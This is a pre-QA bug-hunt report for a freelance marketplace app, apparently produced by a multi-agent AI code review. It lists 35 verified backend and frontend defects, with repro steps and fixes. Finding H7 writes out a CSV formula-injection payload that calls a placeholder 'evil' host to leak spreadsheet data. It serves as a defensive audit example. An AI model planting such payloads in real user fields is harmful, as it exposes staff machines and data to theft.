# Pre-QA Bug Hunt — ShoghlOnline

_Generated by a multi-agent adversarial review: 18 bug-finders across all 19 backend apps + every frontend area → every finding verified by 2 independent skeptics (reproduce + refute) → only findings with a confident "confirmed" and no confident "refute" kept._

**Result:** 39 candidates → **36 survived verification** → **35 unique** (one affiliate bug was found twice). 3 candidates were refuted and dropped (incl. a "reject an already-accepted proposal" concern a verifier disproved).

| Severity | Count |
|---|---|
| 🔴 Critical | 0 |
| 🟠 High | 12 |
| 🟡 Medium | 11 |
| ⚪ Low | 12 |

**Biggest themes:** (1) the **Firestore real-time chat path bypasses server-side controls** (kill-switch + banned-words only run on the unused REST fallback); (2) **PII/security leaks** (reviewer email on a public endpoint, CSV formula injection across 52 admin exports); (3) **auth error-handling on the frontend** ejects users / infinite-loops on transient 500s; (4) several **replace-all / read-modify-write** paths lack transactions or `F()` and lose data under bad input or concurrency.

---

## 🟠 High

### H1 · Category-subscription PUT wipes all subscriptions before validating (no transaction)
- **File:** `backend/apps/subscriptions/api/views.py:29` · _data-integrity_
- **What:** `MySubscriptionsView.put()` deletes the user's entire `CategorySubscription` set, then validates each item. No `@transaction.atomic`, so a 400 leaves the DELETE committed.
- **Repro:** User with 5 subscriptions sends `PUT /me/category-subscriptions` with `[{"category": 999999}]` → all 5 rows gone, response is 400.
- **Fix:** Validate the full desired set first, then delete+recreate inside one `transaction.atomic()`.

### H2 · Re-inviting the same worker to a job → HTTP 500
- **File:** `backend/apps/jobs/services.py:300` · _error-handling_
- **What:** `invite_worker()` does `Invitation.objects.create(...)` with no dup check; the `(job, worker)` unique constraint raises an uncaught `IntegrityError` → 500.
- **Repro:** Employer invites worker 42, then invites again → 500.
- **Fix:** Guard for an existing invitation (raise a domain `ValidationError`) or catch `IntegrityError` → 400 `already_invited`.

### H3 · Pending mutual-cancel survives a dispute; can cancel a resumed contract
- **File:** `backend/apps/contracts/services.py:434` · _correctness_
- **What:** `cancel_requested_by` is set but never cleared — not by `open_dispute()` nor `resolve_dispute("resume")`. A stale cancel request survives the dispute and `confirm_cancel()` still passes its guards.
- **Repro:** Employer requests cancel → worker opens dispute → admin resolves "resume" → worker calls `confirm_cancel` → full escrow refunded and contract CANCELLED despite the resume.
- **Fix:** Clear `cancel_requested_by`/`cancel_reason` in `open_dispute()` and every `resolve_dispute()` outcome.

### H4 · Chat kill-switch (`chat.enabled`) bypassed on the primary Firestore path
- **File:** `backend/apps/chat/services.py:121` · _correctness_
- **What:** The kill-switch is only enforced in the REST `send_message()` fallback. The real-time path (direct Firestore write → Cloud Function → `persist_synced_message()`) never checks `chat_enabled()`, and `firestore.rules` + `FirebaseTokenView` don't either.
- **Repro:** Admin sets `chat.enabled=False` during an incident; any user with a live Firebase session keeps sending & persisting messages.
- **Fix:** Add `chat_enabled()` guard to `persist_synced_message()` and refuse `/chat/token` minting when chat is disabled.

### H5 · Banned-words filter bypassed on the primary Firestore path
- **File:** `backend/apps/chat/services.py:139` · _correctness_
- **What:** `_filter_banned()` runs only in the REST `send_message()`. Firestore-written messages store the raw body; `persist_synced_message()` never masks. Firestore rules only length-check the body.
- **Repro:** With `chat.banned_words` configured, the real-time path renders and persists the unmasked word.
- **Fix:** Apply `_filter_banned()` inside `persist_synced_message()` before creating the `Message` (ideally rewrite the Firestore copy too).

### H6 · Reviewer's real email leaked on the public, unauthenticated reviews endpoint
- **File:** `backend/apps/reviews/api/serializers.py:22` · _security_
- **What:** `get_author_name` falls back to `a.email` when first/last name are blank. Email-OTP users are provisioned with blank names, and `UserReviewsView` is `AllowAny` with no auth. The frontend renders it as the display name.
- **Repro:** OTP user (no name) leaves a review → anonymous `GET /users/42/reviews` returns their raw email as `author_name`.
- **Fix:** Never fall back to email publicly — return a neutral placeholder (e.g. "مستخدم") when names are blank.

### H7 · CSV formula injection in the shared admin export mixin (52 admin views)
- **File:** `backend/apps/core/admin_export.py:42` · _security_
- **What:** `ExportCsvMixin._cell` writes `str(value)` with no neutralization of `= + - @` / leading tab/CR. Applied to 52 admin exports over user-controlled free text (names, company, service/ticket titles, report reason).
- **Repro:** Attacker sets `display_name` to `=HYPERLINK("https://evil/leak?d="&A1,"click")`; an admin exports the row and opens it in Excel → formula executes on a staff machine.
- **Fix:** Prefix formula-leading cells with `'` in `_cell` (and the header row).

### H8 · Transient (non-401) `/auth/me` failure → infinite signin↔dashboard redirect loop
- **File:** `frontend/app/dashboard/page.tsx:139` · _error-handling_
- **What:** A blanket `.catch(() => router.replace(signinHereHref()))` ejects a still-authenticated user on a 500; the signin page sees valid tokens and bounces back → tight loop. `me/profile/page.tsx` guards this with `isAuthError(e)`; dashboard doesn't.
- **Repro:** `/auth/me` returns 500 with valid tokens present → endless flicker between `/signin` and `/dashboard`.
- **Fix:** Guard with `if (isAuthError(e)) redirect; else show in-page retry` (mirror `me/profile/page.tsx:143`).

### H9 · Stale/expired session force-redirects users off PUBLIC pages via the global header
- **File:** `frontend/components/SiteHeader.tsx:53` · _error-handling_
- **What:** `SiteHeader` (in root layout, on every public page) calls `/auth/me` whenever a token is present. If access+refresh are both expired, `api()` does `tokens.clear()` + hard `window.location.href = signin` synchronously — the header's `.catch(() => {})` can't suppress it.
- **Repro:** Idle session, user opens public `/jobs` → force-ejected to `/signin` from a page needing no auth.
- **Fix:** Use a non-redirecting `api()` variant for this optimistic probe; a stale session should only downgrade the header to logged-out chrome.

### H10 · Gallery blanks out entirely (no results, no error, no retry) when "load more" fails
- **File:** `frontend/app/gallery/GalleryClient.tsx:284` · _error-handling_
- **What:** An append failure sets `error=true` but keeps items; the results grid renders only when `!error`, the error card only when `items.length === 0`, empty state only when `!error` — all three starve, so the whole gallery vanishes with no retry reachable.
- **Repro:** 24 works loaded, click "عرض المزيد", fetch fails → blank page, no recovery except changing a filter.
- **Fix:** Gate the results grid on `!loading && items.length > 0` (drop `!error`) and show an inline retry; mirror `JobsClient`.

### H11 · Hourly-rate field can't accept decimals — the decimal point is stripped every keystroke
- **File:** `frontend/app/me/profile/page.tsx:440` · _correctness_
- **What:** Controlled `<input>` stores `String(Number(e.target.value))`; typing "12." normalizes to "12" and snaps back, discarding the dot. Non-integer rates are impossible to enter.
- **Repro:** Worker tries to enter 12.50 → every "." is stripped.
- **Fix:** Keep the raw string in state (`e.target.value || null`); coerce to number only at save time.

### H12 · Proposal status "suspended" leaks raw English into the Arabic RTL UI
- **File:** `frontend/lib/types.ts:216` · _i18n-rtl_
- **What:** Backend sets proposal status `suspended` when a worker is frozen (BR-23), but `PROPOSAL_STATUS_LABEL` has no `suspended` key, so the fallback prints the bare English token. The sibling job-status map does handle it.
- **Repro:** Admin freezes a worker → their proposals show the English word "suspended" on `/me/proposals` etc.
- **Fix:** Add `suspended: "موقوف"` (and a chip tone) to `PROPOSAL_STATUS_LABEL`.

## 🟡 Medium

### M1 · Invoice creation can bill the same completed contract twice (concurrent, unlocked read)
- **File:** `backend/apps/invoices/services.py:36` · _data-integrity_
- **What:** Double-billing guard is an unlocked `.exclude(...)` SELECT with no DB uniqueness tying a contract to one active invoice. Two concurrent requests both see the contract un-billed.
- **Fix:** Partial-unique index (contract, non-rejected invoice) and/or `select_for_update()` the candidate contracts inside the atomic block.

### M2 · Changing phone via `PATCH /auth/me` doesn't reset `phone_verified`
- **File:** `backend/apps/accounts/api/serializers.py:34` · _data-integrity_
- **What:** `phone` is writable and `update()` never clears `phone_verified`. A verified user can PATCH a new/blank number and it stays flagged verified.
- **Fix:** In `MeSerializer.update()`, set `phone_verified=False` when `phone` changes — or make `phone` read-only and force changes through OTP.

### M3 · Duplicate `skill_id` in `PATCH /me/profile` → unhandled 500
- **File:** `backend/apps/profiles/api/serializers.py:305` · _error-handling_
- **What:** Skills replace-all loop creates rows; a repeated `skill_id` violates the `(profile, skill)` unique constraint → uncaught `IntegrityError` → 500 (data is rolled back, but the request errors).
- **Fix:** De-dup submitted skills before the create loop, or add a `validate_skills` that rejects duplicates with a 400.

### M4 · Employer can accept a proposal still awaiting moderation (bypasses `auto_publish` OFF)
- **File:** `backend/apps/jobs/services.py:270` · _correctness_
- **What:** `PENDING_APPROVAL` is in `OPEN_STATUSES`, so `accept_proposal()` allows it. The list view hides pending proposals, but accept-by-pk doesn't filter status.
- **Repro:** `auto_publish=OFF`, worker submits (PENDING_APPROVAL), employer accepts by guessable pk → contract created pre-moderation.
- **Fix:** Restrict acceptance to `(SUBMITTED, VIEWED)`.

### M5 · Buying a high-priced service overflows `total_price` DecimalField → 500
- **File:** `backend/apps/gigs/services.py:105` · _error-handling_
- **What:** `qty` is capped at 999 but `base_price` is unbounded (up to 99,999,999.99); `total_price` is `max_digits=12`. The inline comment claiming the cap prevents overflow is wrong.
- **Repro:** Service `base_price=99999999.99`, buy `quantity=999` → numeric overflow `DataError` → 500.
- **Fix:** Add `max_value` to `base_price` in `ServiceWriteSerializer` and/or validate the computed total against the column limit.

### M6 · `resolve_dispute("resume")` can resume into DELIVERED with no open submission
- **File:** `backend/apps/contracts/services.py:492` · _correctness_
- **What:** `delivered_at` is set once and never cleared (`reject_submission` doesn't clear it). Resume decides status purely from `delivered_at` truthiness → a rejected-only contract resumes to DELIVERED with zero open submissions and wedges the review flow.
- **Fix:** Base the resume target on whether an OPEN submission exists, or clear `delivered_at` in `reject_submission`.

### M7 · Affiliate `total_earned` lost-update (read-modify-write, no lock/`F()`)
- **File:** `backend/apps/affiliate/services.py:170` (also `:188` clawback) · _data-integrity_
- **What:** `update(total_earned=profile.total_earned + amount)` from a Python-side value read without a lock. Concurrent accruals/clawbacks for the same referrer clobber each other; the dashboard figure drifts below the real ledger. _(Found independently by two finders.)_
- **Fix:** Use `F('total_earned') + amount` (and `- amount` in clawback).

### M8 · Charge redirect-flow shows misleading "check the amount" for any failure
- **File:** `frontend/app/wallet/charge/page.tsx:174` · _error-handling_
- **What:** The catch unconditionally shows "⚠️ تحقق من المبلغ" for every `/wallet/charge` failure (500, network, PayPal config), telling users a valid amount is wrong.
- **Fix:** Only show the amount message for amount/validation errors; show a generic gateway/retry message otherwise.

### M9 · Shared/bookmarked jobs URL silently loses its sort order
- **File:** `frontend/app/jobs/JobsClient.tsx:52` · _correctness_
- **What:** Sort is written to the querystring but never read back (`ordering` is hard-initialized to `-published_at`), so a shared `/jobs?ordering=-budget_max` renders the default sort with a contradicting highlighted segment.
- **Fix:** Read `ordering` from `searchParams` in `app/jobs/page.tsx` and initialize state from it (mirror `GalleryClient`).

### M10 · Worker sees a "submit work" form on an already-delivered contract (guaranteed dead-end)
- **File:** `frontend/app/contracts/[id]/page.tsx:156` · _ui-ux_
- **What:** `canDeliver` includes `status === 'delivered'`, but a delivered contract always has an OPEN submission, so `create_submission` rejects with "submission already open." The form can only ever error.
- **Fix:** `canDeliver = my_role === 'worker' && status === 'active'`; show a read-only "awaiting review" notice in the delivered state.

### M11 · Chat attachment 401 retry reuses the expired token (never refreshes)
- **File:** `frontend/lib/useAttachmentUrl.ts:24` · _error-handling_
- **What:** `fetchBlobUrl()` retries a 401 with the same `tokens.access` and never calls `refreshAccess()` (unlike `api()`/`uploadFile()`), so after token expiry attachments can never load.
- **Fix:** Export `refreshAccess` and call it before the retry, then re-fetch with the rotated token.

## ⚪ Low

### L1 · `reject_invoice` mutates status + notifies without a transaction
- **File:** `backend/apps/invoices/services.py:77` · _error-handling_
- Unlike `confirm_invoice`, no `@transaction.atomic` and no `select_for_update`; concurrent confirm/reject can both pass the status guard. **Fix:** decorate atomic + `select_for_update` before the status check.

### L2 · `hourly_rate` accepts negative values (no `MinValueValidator`)
- **File:** `backend/apps/profiles/models.py:59` · _data-integrity_
- A worker can PATCH `hourly_rate=-5.00`; it renders on the public card and sorts to the top of ascending order. **Fix:** `MinValueValidator(0)` on the field or serializer.

### L3 · Concurrent service creation with identical title → slug `IntegrityError` (TOCTOU)
- **File:** `backend/apps/gigs/models.py:71` · _correctness_
- Check-then-insert slug loop isn't atomic; concurrent same-title creates → uncaught 500. **Fix:** retry-on-`IntegrityError` with an incremented suffix, or add a random suffix.

### L4 · Overdue notification never re-fires after a reject/redeliver cycle
- **File:** `backend/apps/contracts/tasks.py:86` · _correctness_
- `overdue_notified_at` is set once and never reset, so a contract only ever warns once even if it goes overdue again. **Fix:** reset it when the contract re-enters active work or its deadline changes.

### L5 · Firestore message create allows unvalidated client `createdAt`
- **File:** `backend/firestore.rules:49` · _data-integrity_
- `createdAt` is allowed via `hasOnly()` but never type/value-checked; a participant can pin a message with a year-9999 timestamp and break ordering/receipts. **Fix:** require `createdAt == request.time` (or `is timestamp` within a window).

### L6 · Affiliate slug generation TOCTOU → uncaught `IntegrityError` (500)
- **File:** `backend/apps/affiliate/services.py:41` · _error-handling_
- Two users whose email local-parts slugify to the same base race on first dashboard access → 500. **Fix:** wrap `create()` in try/except `IntegrityError` and retry with a suffix.

### L7 · Portfolio edit: pasting a cover URL over an uploaded image has no visible effect
- **File:** `frontend/app/me/portfolio/[id]/page.tsx:88` · _correctness_
- `cover_url` is saved but `image_url` (still-linked attachment) always takes precedence for image media, so the pasted URL never shows. **Fix:** unlink the attachment when a cover URL replaces it, or fall back to `cover_url` when explicitly set.

### L8 · `FavThumb` defined inside the component remounts and loses broken-image state
- **File:** `frontend/app/me/favorites/page.tsx:109` · _ui-ux_
- Declared inside the page body → new component type each render → remounts and re-requests dead thumbnails (flashing the broken-image glyph). **Fix:** move `FavThumb` to module scope (like `PortfThumb`).

### L9 · `FileChip` ignores the error state and stays permanently "loading"-looking
- **File:** `frontend/components/chat/AttachmentView.tsx:44` · _ui-ux_
- Only reads `url`, never `error`/`loading`; a failed attachment renders greyed-out and non-clickable forever, indistinguishable from loading. **Fix:** read `error` and render a distinct "تعذّر تحميل الملف" affordance.

### L10 · Grammatically wrong Arabic day count "{n} يوم" for all counts except 1
- **File:** `frontend/components/ServiceDetailView.tsx:77` (+ ~9 more sites) · _i18n-rtl_
- A `pluralizeDays()` helper exists but ~10 render sites bypass it and print the always-singular form ("5 يوم" instead of "5 أيام"). **Fix:** use `pluralizeDays(days)` at each site.

### L11 · Portfolio detail date uses Arabic-Indic digits (inconsistent with the app)
- **File:** `frontend/app/freelancers/[id]/portfolio/[itemId]/page.tsx:44` · _i18n-rtl_
- Uses `toLocaleDateString("ar", …)` (Arabic-Indic digits) — the only spot missing the app-wide `ar-u-nu-latn`. **Fix:** switch the locale to `"ar-u-nu-latn"`.

## Recommended order of attack

1. **Security first (H6, H7):** the reviewer-email leak and CSV formula injection are the ones that hurt most if a real user or QA/security auditor finds them.
2. **Chat server-side controls (H4, H5):** the kill-switch and banned-words gaps defeat operator controls that are assumed to work.
3. **Frontend auth resilience (H8, H9):** infinite loops / public-page ejection are highly visible and will generate QA tickets immediately.
4. **Data-loss & 500s (H1, H2, H3, M1–M5):** transaction/guards on replace-all and concurrent paths.
5. **The rest** as polish before handoff.

## Notes on method / limits
- Each finding above was confirmed by **≥1 skeptic that verified it in the code** and had **no confident refutation**. 3 candidates were refuted and excluded.
- This hunt targeted **logic/correctness/security/UX defects by reading code** — it did **not** run the test suite, exercise the browser, or check performance under load. Pair it with `make test` + `make e2e-full` for runtime regressions.
- Frontend still has **no ESLint** (only `tsc`) — a standing gap that will keep leaking UI bugs (hook deps, unhandled promises, a11y) past every review.
